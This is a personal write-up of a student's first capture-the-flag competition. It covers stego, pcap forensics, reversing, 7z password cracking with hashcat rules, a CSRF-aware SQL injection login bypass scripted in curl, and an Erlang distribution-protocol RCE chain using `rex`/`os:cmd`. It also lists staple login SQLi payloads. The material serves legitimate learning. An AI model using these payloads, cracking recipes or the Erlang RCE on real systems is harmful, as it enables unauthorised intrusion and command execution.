> **Disclaimer:** Educational CTF writeup. All targets were sanctioned
> RowdyHacks 2026 competition infrastructure, now offline. Techniques are
> documented for learning and defense. Challenge host addresses have been
> genericized to `<TARGET>`.

# RowdyHacks 2026 — Master Writeup & Lessons

My first CTF. Finished **20th**. This is the full merge of everything I worked
on: the ones I captured, and the three hard ones I fought down to the last step
before time ran out. Written so future-me can re-skim fast and actually *learn
the techniques*, not just remember the answers.

> **Flag format varies per challenge** — `rowdy{...}` and `flag{...}` both
> appeared. Check the prompt; if the board rejects one, try the other.

---

## Scoreboard

| # | Challenge | Category | Status | Flag / where it ended |
|---|---|---|---|---|
| 1 | ModBus | ICS/OT | ✅ | `rowdy{hey_its_502}` |
| 2 | Goomba | Forensics | ✅ | `rowdy{D0nt_STOMP_0n_m3!}` |
| 3 | Wrong Turn | Forensics | ✅ | `rowdy{you_were_only_supposed_to_blow_the_doors_off}` |
| 4 | Hidden in Plain Sight | Forensics | ✅ | `flag{flexible_array_member}` |
| 5 | Pieces of the Puzzle | Forensics | ✅ | `flag{out_of_order_execution}` |
| 6 | World Is Mine | Web | ✅ | `rowdy{v1rtu4a1_1d0l}` |
| 7 | The Gatekeeper | Reversing | ✅ | `flag{it_compiles_though}` |
| 8 | Back to Nothing | Forensics (500) | ◐ | password `solidsnake`; stuck on final audio digimode decode |
| 9 | Locked File | Crypto (250) | ◐ | fully staged for GPU crack (hash + rules + wordlist built) |
| 10 | Beam Me In | PWN (250) | ◐ | Erlang-dist RCE exploit written; time ran out before running it |

✅ solved · ◐ solved-the-hard-part, didn't finish

---

# PART I — SOLVED

## 1. ModBus — protocol port trivia
**Ask:** which port does Modbus use? → **Modbus TCP = port 502.**
Modbus began as serial (RTU/ASCII over RS-485); Modbus TCP wraps it in TCP/IP on
502, with **no built-in auth or encryption** — which is exactly why it's all over
ICS/SCADA and CTFs. Wireshark filter: `tcp.port == 502` or `modbus`.

---

## 2. Goomba — LSB steganography in a PNG
**Tell:** file named `.jpg` but `file` reported **PNG, RGBA**. PNG is lossless →
LSB stego candidate. No EXIF, no `strings` hit, nothing after `IEND`, alpha all 255.
**Solve:** flag lived in the **least-significant bit of each R/G/B**, read
row-by-row, packed into bytes.
```python
from PIL import Image; import numpy as np
img = np.array(Image.open("Goomba.jpg").convert("RGB"))
bits = img.reshape(-1) & 1
print(np.packbits(bits).tobytes()[:60])
```
**Faster:** `zsteg -a file.png` brute-forces bit planes/orders in one shot.
**Lesson:** trust `file`, not the extension. Lossless formats (PNG/BMP) → LSB.

---

## 3. Wrong Turn — HTTP file carving from a pcap
**Trick:** plain HTTP; six GETs, five decoys, one `GET /docs/getaway-route.pdf`.
The PDF spanned multiple TCP segments and its text was **compressed**
(`ASCII85Decode` + `FlateDecode`), so `strings`/`grep` on the raw pcap found
nothing.
**Solve:** reassemble the HTTP body in TCP-seq order, carve the PDF, `pdftotext`.
```bash
tshark -r f.pcap --export-objects http,out/ && pdftotext out/*.pdf -
```
Or Wireshark → **File → Export Objects → HTTP**.
**Lesson:** compressed file content won't `grep`. Carve the file first, then
decode it properly.

---

## 4. Hidden in Plain Sight (vacation.jpg) — polyglot + nested stego
Three layers:
1. **Appended ZIP.** File size ran past the JPEG end (`FF D9`). Extra bytes after
   a `<<appended-by-SnapFix>>` marker began `PK\x03\x04`. The EXIF
   `ImageDescription` was base64 that spelled out the whole trick.
2. **ZIP contents.** `readme.txt` → passphrase `p1xel_hunt3r` + named steghide;
   plus `photo2.jpg`.
3. **steghide.** `steghide extract -sf photo2.jpg -p p1xel_hunt3r -xf out.txt`.

**Lesson:** always compare file size to where the image *actually* ends. Bytes
after `FF D9`/`IEND` are suspicious. `unzip file.jpg` often just works (ZIP is
read from the end).

---

## 5. Pieces of the Puzzle (capture.pcap) — multi-protocol exfil
**Trick:** a password-protected ZIP (`ctf`) split into **6 pieces across two
channels**:
- Pieces 1,3,5 → HTTP `GET /static/*.part` response bodies
- Pieces 2,4,6 → DNS **TXT** answers to `*.pN.exfil.ctf.local`, base64-encoded

Each piece prefixed `PIECE N OF 6\n`. Strip prefix, order 1→6, concatenate
(piece 1 starts `PK\x03\x04`, piece 6 ends with EOCD `PK\x05\x06`), `unzip -P ctf`.
**Lesson:** exfil spreads across protocols. "1 of N" → hunt the rest in DNS TXT,
ICMP, other ports. **Order by the embedded sequence number, not capture order.**

---

## 6. World Is Mine (MIKUBOARD) — SQLi behind a CSRF wall *(the big web one)*
A Flask forum that buried the real bug under decoys.

**Rabbit holes (intentional time-wasters):**
- Retired staff password `worldismine39` — explicitly "does not work."
- The Flask **SECRET_KEY was crackable** (= `worldismine39`) via flask-unsign,
  but forging `session['staff']=True` never unlocked `/staff` (302→`/login` every
  time). Cracking it still helped: it **ruled out** cookie forging as the path.
- A planted **fake flag** `miku{stop_posting_world_is_mine}` in a thread.

**The real hint** was a forum thread: a user notes a **quote in the username
field changes the error**, a mod says *"I'll check the database query."* → SQLi,
spelled out in plain English.

**Why early SQLi "failed":** every POST hit a **CSRF wall** first and returned
`Form expired` (HTTP 400) — the SQL never ran. The payload was fine; the request
died one layer earlier. `Form expired` (CSRF) vs `incorrect` (auth) look alike in
a grep but mean completely different things.

**The fix — cookie jar to carry a matched CSRF/session pair:**
```bash
BASE='https://<TARGET>'
rm -f jar.txt
TOKEN=$(curl -s -c jar.txt "$BASE/login" \
  | grep -oE 'name="csrf_token" value="[^"]+"' \
  | sed -E 's/.*value="([^"]+)".*/\1/')
curl -s -i -b jar.txt -c jar.txt "$BASE/login" \
  --data-urlencode "csrf_token=$TOKEN" \
  --data-urlencode "username=miku_mod'--" \
  --data-urlencode "password=x" >/dev/null
curl -s -L -b jar.txt "$BASE/staff" | grep -oiE 'rowdy\{[^}]*\}'
```
**Payload:** `miku_mod'--` →
`SELECT * FROM staff WHERE username='miku_mod'--' AND password='x'` — the `--`
comments out the password check.
**Lesson:** right payload, **wrong layer**. When a known-good technique returns a
generic error, suspect a layer in front (CSRF / content-type / WAF) before
changing the payload. Let the server issue the CSRF+session pair (cookie jar or
Burp Repeater); you can't hand-forge a matching Flask-WTF token.

---

## 7. The Gatekeeper — reversing a stripped ELF crackme *(solved this session)*

**Recon:**
```bash
file gatekeeper
# ELF 64-bit LSB executable, x86-64, dynamically linked, stripped, non-PIE (0x400000)
strings -n 4 gatekeeper
```
Strings revealed the whole shape: `== gatekeeper v1.0 ==`, `passphrase: `,
`access granted. nice key.`, `submit it with: check_flag "%s"`,
`denied. go away.`, and a **decoy flag** `flag{left_over_from_v0_9}` (the
"v0.9 leftover" even tells you it's fake).

Program flow: reads a passphrase (`fgets`), strips the newline (`strcspn`), calls
a **check function at `0x40125d`**, and on a non-zero return prints
"access granted" + `submit it with: check_flag "%s"` — meaning **the passphrase
itself is the key**.

**The check (`0x40125d`), decompiled:**
- `strlen(input) == 0x18` → passphrase is exactly **24 chars**
- loop `i` = 0..23: `((input[i] + 3*i) ^ 0x5a) == table[i]`
- `table` = 24 bytes at `0x402010`:
  `3c 35 3d 2a dd 22 dc 2e 21 d0 d1 cb d7 c9 d5 fa d5 fd c4 f2 eb fc f0 98`

**Invert it** — `input[i] = ((table[i] ^ 0x5a) − 3*i) & 0xFF`:
```python
t = bytes.fromhex('3c353d2add22dc2e21d0d1cbd7c9d5fad5fdc4f2ebfcf098')
print(bytes(((t[i]^0x5a)-3*i)&0xff for i in range(len(t))).decode())
# flag{it_compiles_though}
```
Verify live: `echo 'flag{it_compiles_though}' | ./gatekeeper` → "access granted."

**Getting the comparison table out of the binary:**
```bash
objdump -s -j .rodata gatekeeper   # dumps .rodata with addresses; read 0x402010
```
**Lessons:**
- Stripped ≠ hard. `strings` + `objdump -d` locate the compare routine fast.
- Find the function whose return gates "success," read its length check first,
  then the per-byte transform.
- A per-index transform (`+3*i`, `^0x5a`) is trivially **invertible** — don't
  brute-force what you can algebra.
- The planted `flag{...}` in `.rodata` was a decoy. The real flag was computed.

---

# PART II — FOUGHT HARD, NOT CLOSED BEFORE TIME

These taught me the most. Documenting the full approach + exactly how far I got +
what the final step would've been.

## 8. Back to Nothing (Forensics, 500)

**Inputs:** nine files, same stem different extension —
`Rock_Me.{c,cs,db,gd,h,pm,rb,s,sb}`. Eight are **1,024,000 bytes**; `Rock_Me.db`
is **296,026**. Only `Rock_Me.h` has a magic header: `37 7a bc af 27 1c` = **7-zip**.

**Step 1 — it's a split 7z, not RAID.** Parsing the 7z "next header" offset in
`.h` gives a declared total archive size of **8,488,026 bytes** — which *exactly*
equals the sum of all nine files (8×1,024,000 + 296,026). So these are pieces of
one archive produced by `split -b 1024000`, renamed. `.h` is piece 1 (has the
magic); `.db` (the 296,026 remainder) is the last piece.
> Lesson: equal-sized "disk-like" blobs scream RAID, but **do the header math**
> first. Here the sizes summed to the archive's own declared size → simple split.

**Step 2 — the ordering clue: the extensions are chemical element symbols.**
Order by **atomic number**:

`H(1) · C(6) · S(16) · Rb(37) · Sb(51) · Cs(55) · Pm(61) · Gd(64) · Db(105)`

`H` first (magic ✓), `Db` last (the remainder ✓).
```bash
cat Rock_Me.h Rock_Me.c Rock_Me.s Rock_Me.rb Rock_Me.sb \
    Rock_Me.cs Rock_Me.pm Rock_Me.gd Rock_Me.db > Major_Tom.7z
7z l Major_Tom.7z          # size 8488026; one entry: "Major Tom"
```

**Step 3 — crack the archive.** It's **AES-256 + LZMA2, KDF cost 2^19**, inner
file **"Major Tom"** (David Bowie *Space Oddity* theme; "Back to Nothing" = the
countdown). The challenge name **"Rock Me" → rockyou.txt**.
```bash
7z2john Major_Tom.7z > mt.hash
john --wordlist=/usr/share/wordlists/rockyou.txt mt.hash
john --show mt.hash        # Major_Tom.7z:solidsnake
```
Password **`solidsnake`** — cracked in ~40 s. (Metal Gear tie-in: "Major Tom" is
Snake's radio callsign. Theme-driven passwords live in rockyou.)
```bash
7z x Major_Tom.7z -p'solidsnake'   # → Major Tom  (~39.9 MB, no file header)
```

**Step 4 — the final layer (where time ran out).** "Major Tom" is ~39.9 MB of
raw data with no magic. Ruled out: painted-text spectrogram, LSB bitplane image,
strings, file tail. The signal is **structured** — a spectrogram shows a single
**constant-amplitude carrier ~2756 Hz** (+ harmonic). It sounded **harsh/digital**.

Diagnosis: a **single constant carrier = phase-shift keying (PSK)**, not FSK —
which is why `minimodem` (FSK-only) never locked. "Major Tom / radio" → a
**ham-radio digimode**. The finish would be **fldigi** (BPSK31 first, then RTTY /
MFSK16), clicking the carrier in the waterfall. I couldn't get WSL audio routed
to fldigi; the move is fldigi **on Windows** reading the WAV via *File → Audio →
RX capture*, trying sample rates 44100 / 11025 / 8000.

**Lessons:**
- File-extension **misdirection**: they looked like source files; they were
  element symbols. Don't trust the obvious reading of a clue.
- 7z split vs RAID: parse the `.7z` next-header offset; if the piece sizes sum to
  the declared total, it's a plain concatenation puzzle.
- Challenge name = hint: "Rock Me" → rockyou; theme → password.
- **Audio digimode ID:** one steady carrier = PSK → **fldigi**, not minimodem.
  Two shifting tones = FSK → minimodem. Warble/image = SSTV → qsstv.

---

## 9. Locked File (Crypto, 250)

**Inputs:** `KeepOut!.7z`, `words.txt` (the 466k-word system dictionary), and
`rules.txt`:
```
The first letter is capitalized.
One letter is replaced with leetspeek.
There is 1 number and 1 symbol at the end.
```
Archive is **AES-256, KDF cost 2^19**, contents `KeepOut!/flag.jpeg` +
`success.gif`. So the password = `Capitalize( leet_one_letter(word) ) + <digit> + <symbol>`.
This is a **rule + mask** hashcat crack.

**Build it:**
```bash
# 1) hash (note the real filename has a "!" — single-quote it)
/usr/share/john/7z2john.pl 'KeepOut!.7z' > keepout.hash   # one line, $7z$2$19$0$$16$1ac9...
# 2) rule file: capitalize + one leet substitution per line
cat > cap_leet.rule <<'EOF'
c
c sa4
c sa@
c sb8
c se3
c sg9
c sg6
c si1
c si!
c sl1
c so0
c ss5
c ss$
c st7
c st+
c sz2
EOF
# 3) crack: expand words through the rules, then hybrid-append digit+symbol
hashcat --stdout words.txt -r cap_leet.rule | sort -u > base.lst   # ~3.49M candidates
hashcat -m 11600 -a 6 keepout.hash base.lst '?d?s'   # or '?s?d'
hashcat -m 11600 keepout.hash --show
7z x 'KeepOut!.7z' -p'THEPASSWORD'
```

**Why it's unfinished:** keyspace ≈ 3.49M × (10 digits × ~33 symbols) ≈ **1.1B**
against a **cost-2^19** KDF. That's firmly **GPU** territory. My laptop is ARM
(Snapdragon) with no CUDA/usable OpenCL → hashcat only sees CPU → weeks. Staged
it for a **free GPU** (Colab/Kaggle T4): upload `keepout.hash` + `base.lst`, run
the two hashcat lines (~minutes–hours on a T4).

**Gotchas that cost time:**
- The archive was literally named `KeepOut!.7z`; `7z2john` on a guessed name
  silently produced an empty hash → hashcat "hashfile is empty / Token length
  exception." Always `head -c 80 keepout.hash` and `wc -l` (must be **1**).
- `!` triggers **bash history expansion** even inside double quotes → use
  **single quotes**: `'KeepOut!.7z'` (or `set +H`).
- Running `7z2john` twice with `>>`/re-runs appends a second line → malformed
  hash. Overwrite with `>`, then `grep -o '\$7z\$.*'` to keep the bare `$7z$…` line.

**Lessons:**
- Rule-based cracking: `-r rules` for mutations, `-a 6 wordlist ?d?s` to append a
  mask. `hashcat --stdout` previews what a rule file generates.
- **7z/office AES at cost 2^19 ≈ GPU-only.** Don't start it on CPU.
- Free GPU exists for students: **Colab / Kaggle** both give a free T4.

---

## 10. Beam Me In (PWN, 250) — exposed Erlang node → RCE

**Setup:** a provided `rowdy_tunnel.py` bridges local TCP `127.0.0.1:2222` ↔ a
**WSS** endpoint; the remote maps that straight to an **Erlang node's
distribution port**. "Beam" = the **BEAM VM**. "An Erlang node exposed where it
shouldn't be" = the classic **Erlang distribution-protocol RCE**.

**The attack chain:**
1. Speak the Erlang **distribution handshake** (OTP 23–26, v6 `'N'` messages).
   The "token" the challenge keeps mentioning = the **node name you present**,
   which must be fresh each connection.
2. `recv_challenge` **leaks the server's node name cookie-free** — good recon.
3. Authenticate with the node's **magic cookie**:
   `digest = md5(cookie + decimal(peer_challenge))`.
4. Once connected, send a `REG_SEND` to the registered RPC server **`rex`** with
   `{'$gen_call', {Pid, Ref}, {call, os, cmd, [Cmd], GL}}` → reply `{Ref, Output}`.
   That's `rpc:call(Node, os, cmd, [Cmd])` = **shell command execution**.

**Status:** wrote a pure-stdlib exploit (`erl_pwn.py`) doing the handshake + fresh
node-name token + cookie brute/arg + `os:cmd` RCE and reply decode. CTF ended
before I ran it. The one unknown is the **cookie** — either brute common values
or find it in the app's source (`RELEASE_COOKIE` / `vm.args` in a Dockerized
Erlang/Elixir repo). Recon (`--recon`) confirms the node and leaks its name
without needing the cookie.

**Lessons:**
- An exposed Erlang **distribution port + known cookie = full RCE**, by design of
  the protocol (`rpc:call` → `os:cmd`). This is a real-world misconfig, not just a
  CTF toy — EPMD (4369) + dist ports should never face the internet.
- The handshake hands you the node name **before** the cookie check — free recon.
- "No extra Python packages" was the hint that the intended solve is a
  **hand-rolled distribution client** in stdlib.

---

# PART III — TECHNIQUES TOOLBOX (expanded)

### Forensics / stego triage
1. `file <f>` — trust the real type, not the extension.
2. Size vs where the image ends: `FF D9` (JPEG), `IEND` (PNG). Extra bytes =
   appended archive/data.
3. `exiftool <f>` — comments, base64 in fields.
4. `strings -n6 <f> | grep -iE 'flag|rowdy|\{'`
5. `binwalk <f>` / `binwalk -e` / `unzip <f>` (ZIP reads from the end).
6. PNG/BMP → `zsteg -a`. JPEG+pass → `steghide extract`. JPEG no pass →
   `stegseek f.jpg rockyou.txt`.
7. **Audio:** identify the mode before picking a tool —
   - painted text / SSTV image → spectrogram in **Sonic Visualiser / Audacity**, or `qsstv`.
   - **two shifting tones (FSK)** → `minimodem --rx 1200` (sweep 300/1200/rtty).
   - **one constant carrier (PSK/RTTY/MFSK)** → **fldigi**, click the waterfall.
8. One-stop first pass: aperisolve.com.

### PCAP triage
1. `tshark -r f.pcap -q -z io,phs` (protocol survey) / conversations.
2. Files over HTTP → `tshark --export-objects http,out/` or Wireshark Export Objects.
3. Reassemble multi-segment payloads in **TCP seq order**; strip headers.
4. Compressed content (PDF Flate, gzip) → carve, then decode (won't `grep` raw).
5. Weird DNS (long/base64 subdomains, TXT answers) = exfil → `base64 -d`.
6. "piece N of M" → collect across protocols, order by sequence number.

### Web triage
1. **Read the planted content** — threads/comments/"known issues" describe the
   vuln in plain English.
2. View source + JS/CSS (leaks routes/classes like `.flag-box`, `/staff`).
3. Enumerate routes; **status codes tell you what exists** (302 vs 404 vs 403).
4. Flask session = `payload.timestamp.sig`; `flask-unsign --unsign/--wordlist`.
5. Known-good technique returning a generic error → suspect a **layer in front**
   (CSRF / content-type / WAF) before changing the payload.
6. Preserve server-issued CSRF+session with a **cookie jar** (`-c/-b jar.txt`) or
   Burp Repeater.
7. Login SQLi staples: `' OR '1'='1`, `admin'--`, `user'--`, `')--`. Canary: a lone
   `'` that changes the error/500 proves injection.

### Reversing (crackme)
1. `file` (arch / PIE / stripped), `strings` (prompts, decoys, flag format).
2. `objdump -d -M intel` — find the routine whose return gates "success".
3. Read the **length check**, then the **per-byte transform**.
4. Invertible transform (xor/add/index math) → compute the input, don't brute.
5. Pull constants with `objdump -s -j .rodata`.

### Password/archive cracking
- 7z/zip/office → `*2john` → hashcat. `-m 11600` = 7z.
- Mutations: `-r rules`; append mask: `-a 6 wordlist '?d?s'`; preview:
  `hashcat --stdout wordlist -r rules`.
- **KDF cost 2^19 (7z/office AES) = GPU.** CPU is for small keyspaces only.
- Hash hygiene: one line, starts with the right `$tag$`, no appended junk.

### Erlang distribution RCE
- Recon cookie-free: handshake → `recv_challenge` leaks node name.
- Auth: `md5(cookie + decimal(challenge))`; find cookie in source/env or brute.
- RCE: `REG_SEND`→`rex` with `{'$gen_call',{Pid,Ref},{call,os,cmd,[Cmd],GL}}`.

---

# PART IV — META-LESSONS

- **Decoys are a mechanic.** This event plants fake flags (`flag{left_over…}`,
  `miku{…}`), retired passwords, and crackable-but-useless secrets. Cracking a
  dead end isn't wasted — it **eliminates a path**. But weight the **explicit
  in-game hint** heavily and early.
- **A generic error hides a different failure.** `Form expired` (CSRF 400) vs
  `incorrect` (auth 200) look alike in a grep. Read status codes and exact
  messages.
- **Right payload, wrong layer.** Fix the plumbing (CSRF/session/format) before
  changing a payload you're confident in.
- **Match the tool to the signal.** Audio: PSK≠FSK≠SSTV — picking the wrong
  decoder wastes hours. Cracking: cost-19 KDF ≠ CPU job.
- **Clues hide in names & extensions.** "Rock Me" → rockyou; `.h/.c/.rb` → element
  symbols; "Beam" → BEAM VM; "Back to Nothing" → countdown.
- **Know when to offload.** GPU crack → Colab/Kaggle. GUI audio → native Windows.
  Don't grind a task on the wrong hardware.
- **Quoting/shell hygiene is real.** `!` history expansion, filenames with
  spaces/`!`, double-write `>>` vs `>` — small things that silently break tools.

---

# APPENDIX — files & what to keep

**Scripts/artifacts worth keeping (reusable technique):**
- `rowdyhacks-master-writeup.md` — this file.
- `erl_pwn.py` — pure-stdlib Erlang distribution RCE client (reference for any
  future exposed-BEAM target).
- `cap_leet.rule` + the hashcat rule/mask recipe (Locked File).
- `rowdy_tunnel.py` — clean example of a TCP↔WSS bridge (handy pattern).

**Keep only if you'll finish them post-event** (RowdyHacks infra often stays up
a while — worth retrying for practice):
- Back to Nothing: `Major_Tom.7z` (or the `Rock_Me.*` pieces) → fldigi on Windows.
- Locked File: `KeepOut!.7z` + `keepout.hash` + `base.lst` → Colab/Kaggle T4.
- Beam Me In: `rowdy_tunnel.py` + `erl_pwn.py` (if the node's still up).

**Don't need to hoard:** the already-solved inputs (goomba image, pcaps,
vacation.jpg, gatekeeper binary). The method is captured here. If you want a
practice archive, zip the whole challenge set once and delete the loose clutter:
```bash
cd ~/Downloads && zip -r rowdyhacks2026_challenges.zip <challenge folders>
```

---

*First CTF: 20th place, 7 flags, three hard ones taken to the final step. Good
run. The unfinished three are each one concrete action from done — finish them
for the reps.*
